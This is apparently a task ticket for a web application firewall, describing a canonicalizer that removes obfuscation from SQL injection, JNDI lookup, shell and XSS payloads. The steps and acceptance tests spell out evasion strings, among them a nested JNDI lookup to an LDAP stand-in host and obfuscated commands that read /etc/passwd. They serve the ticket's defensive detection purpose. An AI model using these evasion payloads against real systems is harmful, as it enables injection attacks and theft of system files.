### T-0242 · Canonicalizer: the `canonical` view
`P13` `[DP][SEC]` · deps: T-0241 · size: L · owner: waf
**Objective.** Remove syntactic noise attackers add to hide SQL, expression-language and shell payloads.
**Steps.**
1. Implement SQL-context canonicalization: unwrap MySQL versioned comments (`/*!50000 union*/` becomes ` union `), replace inline comments `/**/` and `/*...*/` (non-versioned) with a single space while recording `CommentSeen` flags and positions, handle nested/unterminated comments conservatively.
2. Implement whitespace canonicalization: collapse tabs, newlines, vertical tab, form feed, carriage return, NBSP and Unicode spaces to a single space; treat `+` as space only in decoded query/form views.
3. Implement concatenation joining in evaluable cases: `'un'+'ion'`, `'un' 'ion'`, `CONCAT('un','ion')`, `'un'||'ion'`, adjacent string literals in SQL context, and `CHAR(39)`, `CHR(39)`, `0x27`, `X'27'`, `UNHEX('27')` to literals when appearing near SQL tokens (bounded evaluation to avoid blowups).
4. Implement lookup unwrapping for `${...}` syntaxes: `${lower:x}`, `${upper:x}`, `${::-x}`, `${env:NAME:-x}`, `${sys:...}`, `${date:...}`, `${j${::-n}di:`, nested up to depth 8, recording `LookupObfuscation` flags (shared with JNDI detection T-0291).
5. Implement shell-context canonicalization helpers: backslash/quote removal inside words (`c'a't`, `c""at`), `${IFS}` and `$IFS$9` expansion to space, brace expansion `{cat,/etc/passwd}`, ANSI-C quotes `$'\x63at'`, environment variable stripping, wildcard globbing hints (`/???/c?t`), recorded with flags (full lexer in T-0289).
6. Implement HTML/JS canonicalization helpers for XSS: attribute value unquoting, tag/attribute case folding, slash/whitespace separators between attributes, comment removal, entity decoding in attribute context (full tokenizer in T-0285).
7. Provide per-context entry points (`canon_sql`, `canon_shell`, `canon_html`, `canon_lookup`) so detectors request only needed views (performance), plus a combined `canonical` view for generic signatures.
8. Write 300 table cases including pathological nesting and ensure bounded runtime (budget 4x input).
**Deliverables.**
- `normalize::canonical` modules, tests
**Acceptance.**
- A1: `/*!50000UnIoN*//**/SeLeCt` becomes `union select` in SQL context.
- A2: `${${::-j}${::-n}di:ldap://x.invalid/a}` becomes `${jndi:ldap://x.invalid/a}`.
- A3: `c'a't /e'tc'/p"a"sswd` canonicalizes to `cat /etc/passwd` in shell context.
- A4: nesting beyond depth limits sets `DecodeDepthExceeded` instead of looping.
- A5: no function exceeds 4x output growth or panics (fuzz).
**Tests.**
- Table (300) / proptest / fuzz; bench.
**Notes.** The `decoded` view keeps comment tokens visible; `canonical` collapses them (C4.3).
